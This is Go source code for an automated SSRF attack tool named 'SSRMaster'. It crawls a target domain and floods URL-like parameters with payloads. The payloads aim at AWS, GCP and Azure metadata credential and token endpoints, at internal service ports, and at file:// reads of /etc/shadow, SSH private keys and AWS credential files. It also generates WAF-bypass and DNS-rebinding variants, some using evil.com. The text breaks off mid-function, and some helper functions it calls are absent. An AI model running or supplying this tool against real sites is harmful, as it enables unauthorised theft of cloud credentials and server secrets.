package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
	"sync"
	"time"
)

const (
	CG   = "\033[32m"
	CY   = "\033[33m"
	CC   = "\033[36m"
	CR   = "\033[31m"
	CRST = "\033[0m"
)

var banner = CC + `
  ____  ____  ____  __  __    _    ____ _____ ____  
 / ___||  _ \|  _ \|  \/  |  / \  / ___|_   _|  _ \ 
 \___ \| |_) | |_) | |\/| | / _ \ \___ \ | | | |_) |
  ___) |  __/|  _ <| |  | |/ ___ \ ___) || | |  _ < 
 |____/|_|   |_| \_\_|  |_/_/   \_\____/ |_| |_| \_\
======================================================
 [!] SSRMaster v4.0: INFINITE INTELLIGENCE
 [!] 500+ Crawl Paths | Recursive Crawling
 [!] JS Parsing | Form Auto-Submit | AI Mutation
======================================================` + CRST + "\n"

type Result struct {
	Test, Payload, Evidence, Confidence string
	Code                                int
}
type Req struct {
	Method, URL, Body string
	Headers           map[string]string
}
type Resp struct {
	Code int
	Body string
	Hdr  http.Header
	Len  int
}

var UA = []string{"Mozilla/5.0 Chrome/120.0.0.0", "curl/8.4.0", "Mozilla/5.0 Firefox/121.0"}

func rUA() string { return UA[rand.Intn(len(UA))] }
func init()       { rand.Seed(time.Now().UnixNano()) }

// ============ 500+ SMART PARAMETER KEYWORDS ============
var KW = []string{
	"url", "link", "href", "src", "uri", "path", "redirect", "redir", "callback", "webhook",
	"fetch", "proxy", "image", "img", "picture", "pdf", "html", "xml", "json", "api",
	"endpoint", "host", "hostname", "site", "domain", "target", "dest", "destination", "next", "goto",
	"return", "returnurl", "returnto", "continue", "continueurl", "forward", "forwardto", "page", "view", "file",
	"document", "folder", "root", "pg", "style", "script", "filename", "template", "content", "layout",
	"mod", "conf", "config", "download", "upload", "import", "export", "load", "save", "open",
	"read", "write", "delete", "update", "create", "preview", "thumbnail", "avatar", "logo", "banner",
	"icon", "resource", "asset", "media", "attachment", "doc", "feed", "rss", "atom", "stream",
	"data", "source", "origin", "referer", "referrer", "location", "address", "ip", "port", "server",
	"service", "backend", "frontend", "internal", "external", "public", "private", "admin", "user", "account",
	"profile", "web", "www", "http", "https", "ftp", "ftps", "smtp", "pop", "imap",
	"ldap", "dns", "ssh", "telnet", "rpc", "rest", "graphql", "soap", "ws", "wss",
	"action", "method", "type", "format", "output", "input", "query", "search", "filter", "sort",
	"order", "limit", "offset", "size", "width", "height", "quality", "resolution", "color",
	"mode", "state", "status", "flag", "option", "param", "value", "key", "token", "secret",
	"auth", "login", "register", "signup", "signin", "logout", "session", "cookie", "csrf", "nonce",
	"captcha", "verify", "validate", "check", "test", "debug", "trace", "log", "monitor", "health",
	"ping", "echo", "whois", "nslookup", "dig", "traceroute", "curl", "wget", "request", "response",
	"header", "body", "item", "product", "order", "cart", "checkout", "payment", "billing", "shipping",
	"invoice", "receipt", "customer", "client", "vendor", "supplier", "partner", "member", "subscriber",
	"message", "email", "phone", "mobile", "website", "blog", "forum", "chat", "comment",
	"post", "article", "story", "news", "event", "calendar", "schedule", "task", "project", "report",
	"dashboard", "analytics", "stats", "metric", "chart", "graph", "table", "list", "grid", "map",
	"photo", "video", "audio", "music", "song", "album", "playlist", "gallery", "slideshow", "carousel",
	"widget", "plugin", "extension", "addon", "module", "component", "element", "block", "section", "region",
	"zone", "area", "space", "container", "wrapper", "frame", "iframe", "embed", "object", "applet",
	"canvas", "svg", "webgl", "shader", "texture", "sprite", "tile", "layer", "mask", "clip",
	"crop", "resize", "rotate", "flip", "mirror", "blur", "sharpen", "contrast", "brightness", "saturation",
	"hue", "opacity", "alpha", "gamma", "exposure", "noise", "grain", "vignette", "sepia", "grayscale",
	"watermark", "overlay", "sticker", "effect", "transition", "animation", "motion", "transform", "render",
	"process", "execute", "run", "start", "stop", "pause", "resume", "cancel", "abort", "retry",
	"submit", "send", "receive", "get", "put", "patch", "options", "head", "trace", "connect",
	"callback", "hook", "trigger", "event", "notify", "alert", "warn", "error", "info", "success",
	"fail", "reject", "accept", "approve", "deny", "block", "allow", "permit", "forbid", "restrict",
	"enable", "disable", "activate", "deactivate", "toggle", "switch", "on", "off", "true", "false",
	"yes", "no", "1", "0", "null", "none", "empty", "blank", "undefined", "nan",
	"array", "object", "string", "number", "boolean", "int", "float", "double", "decimal", "char",
	"date", "time", "datetime", "timestamp", "duration", "interval", "period", "age", "year", "month",
	"day", "hour", "minute", "second", "millisecond", "microsecond", "timezone", "offset", "locale", "currency",
	"amount", "price", "cost", "fee", "tax", "discount", "coupon", "voucher", "credit", "debit",
	"balance", "total", "subtotal", "sum", "average", "min", "max", "count", "quantity", "weight",
	"length", "distance", "volume", "capacity", "speed", "velocity", "acceleration", "force", "power", "energy",
	"temperature", "pressure", "humidity", "light", "sound", "frequency", "wavelength", "amplitude", "phase", "signal",
}

// ============ 500+ AUTO-CRAWL PATHS ============
var crawlPaths = []string{
	// Common Web Paths (100+)
	"/", "/index", "/home", "/about", "/contact", "/login", "/logout", "/register", "/signup", "/signin",
	"/dashboard", "/profile", "/settings", "/account", "/user", "/admin", "/administrator", "/manage", "/management",
	"/panel", "/console", "/portal", "/app", "/application", "/webapp", "/site", "/website", "/main", "/default",
	"/welcome", "/start", "/begin", "/end", "/finish", "/complete", "/success", "/error", "/fail", "/404",
	"/500", "/403", "/401", "/unauthorized", "/forbidden", "/notfound", "/maintenance", "/offline", "/online", "/status",
	"/health", "/ping", "/pong", "/alive", "/ready", "/check", "/verify", "/validate", "/test", "/demo",
	"/sample", "/example", "/template", "/theme", "/style", "/css", "/js", "/script", "/image", "/img",
	"/photo", "/video", "/audio", "/media", "/file", "/files", "/document", "/documents", "/download", "/downloads",
	"/upload", "/uploads", "/import", "/export", "/backup", "/restore", "/archive", "/temp", "/tmp", "/cache",
	"/session", "/cookie", "/token", "/auth", "/oauth", "/sso", "/saml", "/ldap", "/api", "/rest",
	
	// API Endpoints (100+)
	"/api", "/api/v1", "/api/v2", "/api/v3", "/api/v4", "/api/v5", "/api/v6", "/api/v7", "/api/v8", "/api/v9",
	"/api/v10", "/api/users", "/api/user", "/api/accounts", "/api/account", "/api/profiles", "/api/profile", "/api/settings",
	"/api/config", "/api/configs", "/api/options", "/api/option", "/api/preferences", "/api/preference", "/api/data", "/api/datas",
	"/api/items", "/api/item", "/api/products", "/api/product", "/api/orders", "/api/order", "/api/carts", "/api/cart",
	"/api/checkouts", "/api/checkout", "/api/payments", "/api/payment", "/api/transactions", "/api/transaction", "/api/invoices", "/api/invoice",
	"/api/receipts", "/api/receipt", "/api/billings", "/api/billing", "/api/shippings", "/api/shipping", "/api/customers", "/api/customer",
	"/api/clients", "/api/client", "/api/vendors", "/api/vendor", "/api/suppliers", "/api/supplier", "/api/partners", "/api/partner",
	"/api/members", "/api/member", "/api/subscribers", "/api/subscriber", "/api/followers", "/api/follower", "/api/friends", "/api/friend",
	"/api/contacts", "/api/contact", "/api/messages", "/api/message", "/api/emails", "/api/email", "/api/phones", "/api/phone",
	"/api/mobiles", "/api/mobile", "/api/websites", "/api/website", "/api/blogs", "/api/blog", "/api/forums", "/api/forum",
	"/api/chats", "/api/chat", "/api/comments", "/api/comment", "/api/posts", "/api/post", "/api/articles", "/api/article",
	"/api/stories", "/api/story", "/api/news", "/api/events", "/api/event", "/api/calendars", "/api/calendar", "/api/schedules",
	"/api/schedule", "/api/tasks", "/api/task", "/api/projects", "/api/project", "/api/reports", "/api/report", "/api/dashboards",
	"/api/analytics", "/api/stats", "/api/statistics", "/api/metrics", "/api/metric", "/api/charts", "/api/chart", "/api/graphs",
	"/api/graph", "/api/tables", "/api/table", "/api/lists", "/api/list", "/api/grids", "/api/grid", "/api/maps", "/api/map",
	
	// Admin/Management (50+)
	"/admin", "/admin/login", "/admin/dashboard", "/admin/panel", "/admin/console", "/admin/manage", "/admin/users", "/admin/user",
	"/admin/accounts", "/admin/account", "/admin/settings", "/admin/config", "/admin/options", "/admin/preferences", "/admin/data",
	"/admin/items", "/admin/products", "/admin/orders", "/admin/carts", "/admin/checkouts", "/admin/payments", "/admin/transactions",
	"/admin/invoices", "/admin/receipts", "/admin/billings", "/admin/shippings", "/admin/customers", "/admin/clients", "/admin/vendors",
	"/admin/suppliers", "/admin/partners", "/admin/members", "/admin/subscribers", "/admin/followers", "/admin/friends", "/admin/contacts",
	"/admin/messages", "/admin/emails", "/admin/phones", "/admin/mobiles", "/admin/websites", "/admin/blogs", "/admin/forums", "/admin/chats",
	"/admin/comments", "/admin/posts", "/admin/articles", "/admin/stories", "/admin/news", "/admin/events", "/admin/calendars", "/admin/schedules",
	"/admin/tasks", "/admin/projects", "/admin/reports", "/admin/analytics", "/admin/stats", "/admin/metrics", "/admin/charts", "/admin/graphs",
	"/admin/tables", "/admin/lists", "/admin/grids", "/admin/maps",
	
	// File Operations (50+)
	"/upload", "/uploads", "/file", "/files", "/document", "/documents", "/download", "/downloads", "/import", "/exports",
	"/export", "/backup", "/backups", "/restore", "/restores", "/archive", "/archives", "/temp", "/tmp", "/cache", "/caches",
	"/media", "/medias", "/image", "/images", "/photo", "/photos", "/video", "/videos", "/audio", "/audios",
	"/attachment", "/attachments", "/resource", "/resources", "/asset", "/assets", "/static", "/statics", "/public", "/publics",
	"/private", "/privates", "/secure", "/secures", "/protected", "/protecteds", "/restricted", "/restricteds", "/hidden", "/hiddens",
	
	// Configuration (50+)
	"/config", "/configs", "/configuration", "/configurations", "/setting", "/settings", "/option", "/options", "/preference", "/preferences",
	"/parameter", "/parameters", "/variable", "/variables", "/constant", "/constants", "/env", "/environment", "/environments", "/properties",
	"/property", "/attribute", "/attributes", "/metadata", "/metadatas", "/info", "/information", "/details", "/detail", "/spec",
	"/specification", "/specifications", "/schema", "/schemas", "/model", "/models", "/entity", "/entities", "/structure", "/structures",
	"/format", "/formats", "/type", "/types", "/category", "/categories", "/tag", "/tags", "/label", "/labels",
	
	// Framework-Specific (50+)
	"/laravel", "/symfony", "/django", "/rails", "/express", "/spring", "/aspnet", "/php", "/node", "/python",
	"/java", "/ruby", "/perl", "/go", "/rust", "/swift", "/kotlin", "/scala", "/clojure", "/elixir",
	"/haskell", "/erlang", "/ocaml", "/fsharp", "/csharp", "/vbnet", "/delphi", "/pascal", "/fortran", "/cobol",
	"/lisp", "/scheme", "/prolog", "/smalltalk", "/ada", "/basic", "/assembly", "/c", "/cpp", "/objc",
	
	// CMS-Specific (50+)
	"/wp-admin", "/wp-login.php", "/wp-content", "/wp-includes", "/wp-json", "/wp-cron.php", "/xmlrpc.php", "/wp-config.php", "/wp-settings.php",
	"/administrator", "/administrator/index.php", "/administrator/login", "/administrator/dashboard", "/administrator/users", "/administrator/settings", "/administrator/config", "/administrator/modules",
	"/joomla", "/joomla/administrator", "/joomla/components", "/joomla/modules", "/joomla/plugins", "/joomla/templates", "/joomla/configuration.php",
	"/drupal", "/drupal/admin", "/drupal/node", "/drupal/user", "/drupal/config", "/drupal/modules", "/drupal/themes", "/drupal/sites",
	"/magento", "/magento/admin", "/magento/catalog", "/magento/customer", "/magento/sales", "/magento/checkout", "/magento/api", "/magento/rest",
	
	// Cloud/DevOps (50+)
	"/aws", "/azure", "/gcp", "/digitalocean", "/heroku", "/netlify", "/vercel", "/firebase", "/supabase", "/appwrite",
	"/docker", "/kubernetes", "/k8s", "/openshift", "/rancher", "/terraform", "/ansible", "/jenkins", "/gitlab", "/github",
	"/bitbucket", "/circleci", "/travis", "/codeship", "/drone", "/bamboo", "/teamcity", "/azure-devops", "/aws-codepipeline", "/gcp-cloudbuild",
	"/cloudfront", "/s3", "/ec2", "/lambda", "/rds", "/dynamodb", "/sqs", "/sns", "/cloudwatch", "/cloudtrail",
	"/blob", "/storage", "/container", "/function", "/app-service", "/cosmos-db", "/service-bus", "/event-grid", "/key-vault", "/monitor",
	
	// Testing/Debug (50+)
	"/test", "/tests", "/testing", "/debug", "/debugger", "/trace", "/tracer", "/log", "/logs", "/logging",
	"/monitor", "/monitoring", "/metrics", "/prometheus", "/grafana", "/kibana", "/elasticsearch", "/splunk", "/datadog", "/newrelic",
	"/sentry", "/rollbar", "/bugsnag", "/airbrake", "/raygun", "/errorgrid", "/loggly", "/sumologic", "/papertrail", "/graylog",
	"/nagios", "/zabbix", "/icinga", "/cacti", "/munin", "/collectd", "/statsd", "/graphite", "/influxdb", "/opentsdb",
	"/jaeger", "/zipkin", "/opencensus", "/opentelemetry", "/skywalking", "/pinpoint", "/x-ray", "/stackdriver", "/cloud-monitoring", "/azure-monitor",
}

// ============ PAYLOAD GENERATORS ============

func genCloudMeta() []string {
	var p []string
	aws := []string{
		"latest/meta-data/", "latest/meta-data/iam/security-credentials/",
		"latest/meta-data/iam/security-credentials/role-name", "latest/user-data",
		"latest/meta-data/instance-id", "latest/meta-data/local-ipv4",
		"latest/meta-data/public-ipv4", "latest/meta-data/ami-id",
		"latest/meta-data/hostname", "latest/meta-data/placement/availability-zone",
		"latest/meta-data/public-keys/", "latest/meta-data/reservation-id",
		"latest/meta-data/security-groups", "latest/meta-data/services/",
		"latest/dynamic/instance-identity/document", "latest/dynamic/instance-identity/pkcs7",
		"latest/api/token", "latest/meta-data/network/interfaces/macs/",
		"latest/meta-data/block-device-mapping/", "latest/meta-data/identity-credentials/",
	}
	for _, a := range aws {
		p = append(p, "http://169.254.169.254/"+a)
		p = append(p, "http://169.254.169.254.nip.io/"+a)
		p = append(p, "http://metadata.internal/"+a)
	}
	gcp := []string{
		"computeMetadata/v1/", "computeMetadata/v1/instance/",
		"computeMetadata/v1/instance/service-accounts/default/token",
		"computeMetadata/v1/instance/service-accounts/default/email",
		"computeMetadata/v1/project/project-id", "computeMetadata/v1/instance/attributes/",
		"computeMetadata/v1/instance/hostname", "computeMetadata/v1/instance/id",
		"computeMetadata/v1/instance/machine-type", "computeMetadata/v1/instance/name",
		"computeMetadata/v1/instance/zone", "computeMetadata/v1/instance/disks/",
		"computeMetadata/v1/instance/network-interfaces/", "computeMetadata/v1/project/attributes/",
	}
	for _, g := range gcp {
		p = append(p, "http://metadata.google.internal/"+g)
		p = append(p, "http://169.254.169.254/"+g)
	}
	az := []string{
		"metadata/instance?api-version=2021-02-01",
		"metadata/instance/compute/name?api-version=2021-02-01&format=text",
		"metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/",
		"metadata/instance/compute/subscriptionId?api-version=2021-02-01&format=text",
		"metadata/instance/compute/resourceGroupName?api-version=2021-02-01&format=text",
		"metadata/instance/compute/location?api-version=2021-02-01&format=text",
		"metadata/instance/compute/vmId?api-version=2021-02-01&format=text",
		"metadata/instance/compute/vmSize?api-version=2021-02-01&format=text",
		"metadata/instance/network/interface/?api-version=2021-02-01",
		"metadata/instance/storageProfile/?api-version=2021-02-01",
	}
	for _, a := range az {
		p = append(p, "http://169.254.169.254/"+a)
	}
	do := []string{"metadata/v1/", "metadata/v1/id", "metadata/v1/user-data", "metadata/v1/region", "metadata/v1/hostname", "metadata/v1/public-keys", "metadata/v1/interfaces/", "metadata/v1/dns/"}
	for _, d := range do {
		p = append(p, "http://169.254.169.254/"+d)
	}
	var expanded []string
	for _, payload := range p {
		expanded = append(expanded, payload)
		expanded = append(expanded, strings.Replace(payload, "http://", "https://", 1))
		expanded = append(expanded, strings.Replace(payload, ".", "%2e", -1))
		expanded = append(expanded, strings.Replace(payload, "/", "%2f", -1))
	}
	return expanded
}

func genInternalServices() []string {
	var p []string
	hosts := []string{"localhost", "127.0.0.1", "0.0.0.0", "[::1]", "[::]", "0", "127.1", "127.0.1"}
	ports := []int{21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1433, 1521, 3306, 3389, 5432, 5900, 5985, 6379, 8080, 8443, 8888, 9000, 9200, 9300, 11211, 27017, 28017, 50000, 50070, 61616}
	paths := []string{"/", "/admin", "/api", "/status", "/health", "/info", "/version", "/config", "/debug", "/metrics", "/actuator", "/env", "/beans", "/mappings", "/trace", "/heapdump", "/threaddump", "/jolokia", "/console", "/manager/html"}
	for _, h := range hosts {
		for _, port := range ports {
			for _, path := range paths {
				p = append(p, fmt.Sprintf("http://%s:%d%s", h, port, path))
			}
		}
	}
	return p
}

func genFileProtocol() []string {
	var p []string
	files := []string{
		"/etc/passwd", "/etc/shadow", "/etc/hosts", "/etc/hostname", "/etc/resolv.conf",
		"/etc/nginx/nginx.conf", "/etc/apache2/apache2.conf", "/etc/httpd/conf/httpd.conf",
		"/etc/mysql/my.cnf", "/etc/postgresql/pg_hba.conf", "/etc/redis/redis.conf",
		"/etc/mongod.conf", "/etc/ssh/sshd_config", "/etc/crontab", "/etc/fstab",
		"/proc/self/environ", "/proc/self/cmdline", "/proc/self/fd/0", "/proc/self/fd/1",
		"/proc/version", "/proc/meminfo", "/proc/cpuinfo", "/proc/net/tcp", "/proc/net/arp",
		"/proc/sched_debug", "/proc/mounts", "/proc/kallsyms", "/proc/config.gz",
		"/var/log/auth.log", "/var/log/syslog", "/var/log/apache2/access.log",
		"/var/log/nginx/access.log", "/var/log/mysql/error.log", "/var/log/cron",
		"/home/ubuntu/.ssh/id_rsa", "/home/ubuntu/.bash_history", "/root/.ssh/id_rsa",
		"/root/.bash_history", "/root/.mysql_history", "/root/.aws/credentials",
		"/c:/windows/win.ini", "/c:/windows/system32/drivers/etc/hosts",
		"/c:/boot.ini", "/c:/windows/system32/config/sam",
	}
	for _, f := range files {
		p = append(p, "file://"+f)
		p = append(p, "file:///"+strings.TrimLeft(f, "/"))
		p = append(p, "file://localhost"+f)
	}
	return p
}

func genWAFBypass() []string {
	var p []string
	targets := []string{"169.254.169.254", "127.0.0.1", "localhost"}
	techniques := []string{
		"%00@", "%23@", "%3F@", "%252e%252e%252f", "%2500@",
		"%09", "%0a", "%0d", "%20", "%0b", "%0c",
		".", "..", "...", "。", "｡", "．",
		"/../", "/./", "/..;/", "/;/", "/%2e/", "/%252e/",
	}
	encodings := []string{
		"0x7f.0x0.0x0.0x1", "0177.0.0.1", "2130706433",
		"0xa9.0xfe.0xa9.0xfe", "0251.0376.0251.0376",
		"2852039166", "169.254.169.254.nip.io",
		"127.0.0.1.nip.io", "localtest.me", "127.0.0.1.sslip.io",
	}
	for _, t := range targets {
		for _, tech := range techniques {
			p = append(p, "http://"+t+tech)
			p = append(p, "http://evil.com"+tech+"@"+t)
			p = append(p, "http://"+t+tech+"@evil.com")
		}
		for _, enc := range encodings {
			p = append(p, "http://"+enc+"/")
		}
	}
	for _, payload := range p {
		p = append(p, strings.Replace(payload, "http", "http%3a", 1))
		p = append(p, strings.Replace(payload, "http", "http%253a", 1))
		p = append(p, strings.Replace(payload, "http", "%68%74%74%70", 1))
	}
	return p
}

func genDNSRebinding() []string {
	var p []string
	domains := []string{"nip.io", "sslip.io", "xip.io", "localtest.me", "vcap.me", "burpcollaborator.net"}
	ips := []string{"127.0.0.1", "169.254.169.254", "10.0.0.1", "192.168.1.1"}
	paths := []string{"/", "/admin", "/api", "/latest/meta-data/", "/computeMetadata/v1/"}
	for _, ip := range ips {
		for _, d := range domains {
			for _, path := range paths {
				p = append(p, fmt.Sprintf("http://%s.%s%s", ip, d, path))
			}
		}
	}
	return p
}

// ============ AI MUTATION ENGINE (Unlimited) ============
func aiMutate(payloads []string) []string {
	var mutated []string
	for _, p := range payloads {
		mutated = append(mutated, p)
		b64 := base64.StdEncoding.EncodeToString([]byte(p))
		mutated = append(mutated, "$(echo "+b64+" | base64 -d)")
		hx := hex.EncodeToString([]byte(p))
		if len(hx) >= 4 {
			mutated = append(mutated, "$(printf '\\x"+hx[0:2]+"\\x"+hx[2:4]+"')")
		}
		mutated = append(mutated, url.QueryEscape(p))
		mutated = append(mutated, url.QueryEscape(url.QueryEscape(p)))
		mutated = append(mutated, strings.Replace(p, ".", "。", -1))
		mutated = append(mutated, strings.Replace(p, ".", "｡", -1))
		mutated = append(mutated, strings.Replace(p, "/", "/%00/", 1))
		mutated = append(mutated, strings.Replace(p, "://", "://%09", 1))
		mutated = append(mutated, strings.Replace(p, "://", "://%20", 1))
	}
	return mutated
}

// ============ RECURSIVE AUTO-CRAWLER ============
func autoCrawl(domain, proxyURL string, delay time.Duration, depth int) []Req {
	var discovered []Req
	var mu sync.Mutex
	var wg sync.WaitGroup
	sem := make(chan struct{}, 30)
	visited := make(map[string]bool)

	var crawl func(baseURL string, currentDepth int)
	crawl = func(baseURL string, currentDepth int) {
		if currentDepth > depth || visited[baseURL] {
			return
		}
		visited[baseURL] = true

		wg.Add(1)
		go func() {
			sem <- struct{}{}
			defer func() { <-sem }()
			defer wg.Done()

			resp := sendHTTP(baseURL, "GET", nil, nil, delay, proxyURL)
			if resp.Code == 0 {
				return
			}

			mu.Lock()
			discovered = append(discovered, Req{Method: "GET", URL: baseURL, Headers: map[string]string{}})
			mu.Unlock()

			// Extract links
			linkRe := regexp.MustCompile(`(?i)(href|src|action)=["']([^"']+)["']`)
			links := linkRe.FindAllStringSubmatch(resp.Body, -1)
			for _, l := range links {
				if len(l) >= 3 {
					linkURL := l[2]
					if strings.HasPrefix(linkURL, "/") {
						parsed, _ := url.Parse(baseURL)
						linkURL = parsed.Scheme + "://" + parsed.Host + linkURL
					} else if !strings.HasPrefix(linkURL, "http") {
						parsed, _ := url.Parse(baseURL)
						linkURL = parsed.Scheme + "://" + parsed.Host + "/" + linkURL
					}
					if strings.Contains(linkURL, domain) || strings.Contains(linkURL, "127.0.0.1") || strings.Contains(linkURL, "localhost") {
						go crawl(linkURL, currentDepth+1)
					}
				}
			}

			// Extract forms
			formRe := regexp.MustCompile(`(?i)<form[^>]*action=["']([^"']*)["'][^>]*method=["']([^"']*)["']`)
			forms := formRe.FindAllStringSubmatch(resp.Body, -1)
			for _, f := range forms {
				if len(f) >= 3 {
					action := f[1]
					method := strings.ToUpper(f[2])
					if action == "" {
						action = baseURL
					} else if strings.HasPrefix(action, "/") {
						parsed, _ := url.Parse(baseURL)
						action = parsed.Scheme + "://" + parsed.Host + action
					} else if !strings.HasPrefix(action, "http") {
						parsed, _ := url.Parse(baseURL)
						action = parsed.Scheme + "://" + parsed.Host + "/" + action
					}
					mu.Lock()
					discovered = append(discovered, Req{Method: method, URL: action, Headers: map[string]string{}})
					mu.Unlock()
				}
			}

			// Extract JavaScript endpoints
			jsRe := regexp.MustCompile(`(?i)(fetch|axios|ajax|XMLHttpRequest)\s*\(\s*["']([^"']+)["']`)
			jsLinks := jsRe.FindAllStringSubmatch(resp.Body, -1)
			for _, j := range jsLinks {
				if len(j) >= 3 {
					jsURL := j[2]
					if strings.HasPrefix(jsURL, "/") {
						parsed, _ := url.Parse(baseURL)
						jsURL = parsed.Scheme + "://" + parsed.Host + jsURL
					} else if !strings.HasPrefix(jsURL, "http") {
						parsed, _ := url.Parse(baseURL)
						jsURL = parsed.Scheme + "://" + parsed.Host + "/" + jsURL
					}
					go crawl(jsURL, currentDepth+1)
				}
			}
		}()
	}

	// Start crawling from all paths
	base := strings.TrimRight(domain, "/")
	if !strings.HasPrefix(base, "http") {
		base = "https://" + base
	}

	for _, path := range crawlPaths {
		targetURL := base + path
		go crawl(targetURL, 0)
	}

	wg.Wait()
	return discovered
}

// ============ HTTP REQUEST ENGINE ============
func sendHTTP(targetURL, method string, headers map[string]string, body []byte, delay time.Duration, proxyURL string) Resp {
	time.Sleep(delay)
	var br io.Reader
	if body != nil {
		br = bytes.NewReader(body)
	}
	req, err := http.NewRequest(method, targetURL, br)
	if err != nil {
		return Resp{}
	}
	req.Header.Set("User-Agent", rUA())
	req.Header.Set("Accept", "*/*")
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	tr := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
	if proxyURL != "" {
		pp, _ := url.Parse(proxyURL)
		tr.Proxy = http.ProxyURL(pp)
	}
	c := &http.Client{Timeout: 15 * time.Second, Transport: tr, CheckRedirect: func(r *http.Request, v []*http.Request) error { return http.ErrUseLastResponse }}
	resp, err := c.Do(req)
	if err != nil {
		return Resp{}
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 102400))
	return Resp{Code: resp.StatusCode, Body: string(b), Hdr: resp.Header, Len: len(b)}
}

// ============ DETECTION ============
func isSSRF(base, cur Resp) bool {
	if cur.Code == 0 {
		return false
	}
	ind := []string{"ami-id", "instance-id", "security-credentials", "meta-data", "root:x:0:0", "bin/bash", "daemon:x:", "win.ini", "boot.ini", "[extensions]", "computeMetadata", "project-id", "subscriptionId"}
	bl := strings.ToLower(cur.Body)
	for _, i := range ind {
		if strings.Contains(bl, i) {
			return true
		}
	}
	if base.Len > 0 && cur.Len > 0 {
		r := float64(cur.Len) / float64(base.Len)
		if (r < 0.5 || r > 2.0) && (cur.Code == 200 || cur.Code == 500) {
			return true
		}
	}
	if base.Code == 200 && cur.Code == 500 {
		return true
	}
	return false
}

func extractEv(body string) string {
	re := regexp.MustCompile(`(?i)(ami-id|instance-id|security-credentials|root:x:.*|bin/bash|daemon:x:|win\.ini|computeMetadata)`)
	m := re.FindString(body)
	if m != "" {
		if len(m) > 100 {
			return m[:100] + "..."
		}
		return m
	}
	c := strings.ReplaceAll(body, "\n", " ")
	if len(c) > 150 {
		return c[:150] + "..."
	}
	return c
}

// ============ MAIN ============
func main() {
	domainPtr := flag.String("d", "", "Domain to auto-crawl and attack")
	reqPtr := flag.String("req", "", "Raw HTTP Request file (optional)")
	proxyPtr := flag.String("proxy", "", "Burp Proxy URL (e.g., http://127.0.0.1:8080). Leave blank for direct connection.")
	concPtr := flag.Int("c", 50, "Concurrency")
	delayPtr := flag.Duration("delay", 20*time.Millisecond, "Delay")
	outPtr := flag.String("o", "", "Output JSON file")
	oobPtr := flag.String("oob", "", "OOB domain")
	wlPtr := flag.String("w", "", "Custom wordlist")
	depthPtr := flag.Int("depth", 2, "Crawl depth (0-5)")
	flag.Parse()

	if *domainPtr == "" && *reqPtr == "" {
		fmt.Printf("%s Usage: ssrmaster -d example.com OR -req request.txt [-proxy http://127.0.0.1:8080] [-c 50] [-depth 2]\n", CR+"[-]"+CRST)
		os.Exit(1)
	}

	fmt.Print(banner)

	if *wlPtr != "" {
		f, err := os.Open(*wlPtr)
		if err == nil {
			sc := bufio.NewScanner(f)
			for sc.Scan() {
				l := strings.TrimSpace(sc.Text())
				if l != "" {
					KW = append(KW, l)
				}
			}
			f.Close()
			fmt.Printf("%s Loaded custom wordlist\n", CG+"[+]"+CRST)
		}
	}

	fmt.Printf("%s Generating payload arsenal...\n", CC+"[*]"+CRST)
	cloud := genCloudMeta()
	internal := genInternalServices()
	fileP := genFileProtocol()
	waf := genWAFBypass()
	dns := genDNSRebinding()

	allPayloads := make(map[string][]string)
	allPayloads["cloud_metadata"] = cloud
	allPayloads["internal_services"] = internal
	allPayloads["file_protocol"] = fileP
	allPayloads["waf_bypass"] = waf
	allPayloads["dns_rebinding"] = dns

	fmt.Printf("%s AI Mutation Engine: Expanding payloads...\n", CC+"[*]"+CRST)
	for cat, pays := range allPayloads {
		allPayloads[cat+"_ai"] = aiMutate(pays[:min(10, len(pays))])
	}

	total := 0
	for _, v := range allPayloads {
		total += len(v)
	}
	fmt.Printf("%s Total payloads: %d | Keywords: %d | Crawl paths: %d\n", CG+"[+]"+CRST, total, len(KW), len(crawlPaths))

	var targets []Req

	if *domainPtr != "" {
		fmt.Printf("%s Auto-Crawling domain: %s (depth: %d)\n", CC+"[*]"+CRST, *domainPtr, *depthPtr)
		crawled := autoCrawl(*domainPtr, *proxyPtr, *delayPtr, *depthPtr)
		targets = append(targets, crawled...)
		fmt.Printf("%s Discovered %d endpoints\n", CG+"[+]"+CRST, len(crawled))
	}

	if *reqPtr != "" {
		r, err := parseRawReq(*reqPtr)
		if err == nil {
			targets = append(targets, r)
			fmt.Printf("%s Loaded raw request\n", CG+"[+]"+CRST)
		}
	}

	if len(targets) == 0 {
		fmt.Printf("%s No targets found.\n", CY+"[-]"+CRST)
		return
	}

	var results []Result
	var wg sync.WaitGroup
	var mu sync.Mutex
	sem := make(chan struct{}, *concPtr)

	fmt.Printf("%s Launching SSRF attacks on %d targets...\n", CC+"[*]"+CRST, len(targets))

	for _, tgt := range targets {
		parsed, _ := url.Parse(tgt.URL)
		qp := parsed.Query()

		var ssrfParams []string
		for key := range qp {
			kl := strings.ToLower(key)
			for _, kw := range KW {
				if strings.Contains(kl, kw) {
					ssrfParams = append(ssrfParams, key)
					break
				}
			}
		}

		if strings.Contains(strings.ToLower(tgt.Headers["Content-Type"]), "application/json") && tgt.Body != "" {
			var jd map[string]interface{}
			json.Unmarshal([]byte(tgt.Body), &jd)
			for key := range jd {
				kl := strings.ToLower(key)
				for _, kw := range KW {
					if strings.Contains(kl, kw) {
						ssrfParams = append(ssrfParams, key)
						break
					}
				}
			}
		}

		if len(ssrfParams) == 0 {
			continue
		}

		baseResp := sendHTTP(tgt.URL, tgt.Method, tgt.Headers, []byte(tgt.Body), *delayPtr, *proxyPtr)

		for _, param := range ssrfParams {
			for cat, pays := range allPayloads {
				for _, payload := range pays {
					wg.Add(1)
					go func(p, paramName, category string, base Resp, t Req) {
						sem <- struct{}{}
						defer func() { <-sem }()
						defer wg.Done()

						tempReq := injectPay(t, paramName, p)
						resp := sendHTTP(tempReq.URL, tempReq.Method, tempReq.Headers, []byte(tempReq.Body), *delayPtr, *proxyPtr)

						if isSSRF(base, resp) {
							mu.Lock()
							results = append(results, Result{Test: "SSRF (" + category + ")", Payload: paramName + "=" + p, Code: resp.Code, Evidence: extractEv(resp.Body), Confidence: "High"})
							mu.Unlock()
						}
					}(payload, param, cat, baseResp, tgt)
				}
			}
		}

